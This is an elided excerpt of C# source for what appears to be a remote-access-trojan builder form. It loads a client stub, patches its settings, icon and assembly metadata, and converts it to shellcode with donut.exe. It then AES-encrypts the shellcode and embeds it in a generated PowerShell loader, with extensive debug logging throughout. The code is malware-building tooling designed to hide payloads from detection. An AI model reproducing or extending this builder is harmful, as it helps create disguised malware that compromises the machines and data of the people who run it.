...
namespace Server.Forms
{
    public partial class FormBuilder : Form
    {
        ...
        {
            // Validate inputs to prevent format errors
            if (!chkPaste_bin.Checked)
            {
            ...
            ModuleDefMD asmDef = null;
            string debugLogPath = Path.Combine(Application.StartupPath, "debug.log");
            string arrayLogPath = Path.Combine(Application.StartupPath, "array.log");
            try
            {
                File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Starting shellcode generation...\n");
                ...
                using (asmDef = ModuleDefMD.Load(@"Stub/Client.exe"))
                {
                    ...
                    File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Copied Client.exe to {tempPath}\n");
                    ...
                    asmDef.Dispose();
                    File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Wrote settings to {tempPath}\n");

                    if (btnAssembly.Checked)
                    {
                        WriteAssembly(tempPath);
                        File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Applied assembly metadata to {tempPath}\n");
                    }
                    if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
                    {
                        ...
                        File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Injected icon into {tempPath}\n");
                    }
                    ...
                    if (!File.Exists(donutPath))
                    {
                        ...
                        File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Wrote donut.exe to {donutPath}\n");
                    }
                    if (!File.Exists(donutPath))
                    {
                    ...
                    File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Running donut.exe with args: {process.StartInfo.Arguments}\n");
                    ...
                    process.Close();
                    File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Donut.exe completed, exit code: {exitCode}, stdout: {stdOutput}, stderr: {errorOutput}\n");
                    ...
                    // Read and validate the generated shellcode
                    byte[] shellcode;
                    try
                    {
                        shellcode = File.ReadAllBytes(tempShellcodePath);
                        File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Read shellcode from {tempShellcodePath}, length: {shellcode.Length} bytes\n");
                    }
                    catch (Exception ex)
                    {
                    ...
                    try
                    {
                        using (Aes aes = Aes.Create())
                        {
                            ...
                            iv = aes.IV;   // 16 bytes
                            File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Generated AES key (length: {key.Length}) and IV (length: {iv.Length})\n");
                            ...
                            File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Encrypted shellcode, length: {encryptedShellcode.Length} bytes\n");
                        }
                    }
                    catch (Exception ex)
                    {
                    ...
                    // Convert arrays to string representation for PowerShell with validation
                    string keyArray, ivArray, shellcodeArray;
                    try
                    {
                        // Format bytes as plain decimal integers (0-255)
                        ...
                        File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Formatted byte arrays for PowerShell script\n");
                        ...
                        // Log full arrays to a separate file for inspection
                        File.WriteAllText(arrayLogPath, $"keyArray:\n{keyArray}\n\nivArray:\n{ivArray}\n\nshellcodeArray (first 1000 chars):\n{shellcodeArray.Substring(0, Math.Min(1000, shellcodeArray.Length))}...");
                        File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Saved byte arrays to {arrayLogPath}\n");

                        // Log samples for quick reference
                        File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Key array sample: {keyArray.Substring(0, Math.Min(50, keyArray.Length))}...\n");
                        File.AppendAllText(debugLogPath, $"[{DateTime.Now}] IV array sample: {ivArray.Substring(0, Math.Min(50, ivArray.Length))}...\n");
                        File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Shellcode array sample: {shellcodeArray.Substring(0, Math.Min(50, shellcodeArray.Length))}...\n");
                    }
                    catch (Exception ex)
                    {
...
";
                    ...
                    try{
                        ...
                        File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Generated PowerShell script, length: {finalScript.Length} characters\n");
                    }
                    catch (Exception ex){
                        File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Error embedding arrays in PowerShell script: {ex.Message}\nKey sample: {keyArray.Substring(0, Math.Min(50, keyArray.Length))}...\nIV sample: {ivArray.Substring(0, Math.Min(50, ivArray.Length))}...\nShellcode sample: {shellcodeArray.Substring(0, Math.Min(50, shellcodeArray.Length))}...\nStack Trace: {ex.StackTrace}\n");
                    ...
                    try{
                        ...
                        File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Saved PowerShell script to {savePath}\n");
                    }
                    catch (Exception ex)
                    {
                    ...
                    try{
                        ...
                        File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Deleted temporary shellcode file: {tempShellcodePath}\n");
                        File.Delete(tempPath);
                        File.Delete(donutPath);
                        File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Deleted temporary files: {tempPath}, {donutPath}\n");
                    }
                    catch (Exception ex) {
                        File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Cleanup error: {ex.Message}\n");
                    }
                ...
                File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Format error: {ex.Message}\nStack Trace: {ex.StackTrace}\n");
                ...
                File.AppendAllText(debugLogPath, $"[{DateTime.Now}] Error: {ex.Message}\nStack Trace: {ex.StackTrace}\n");
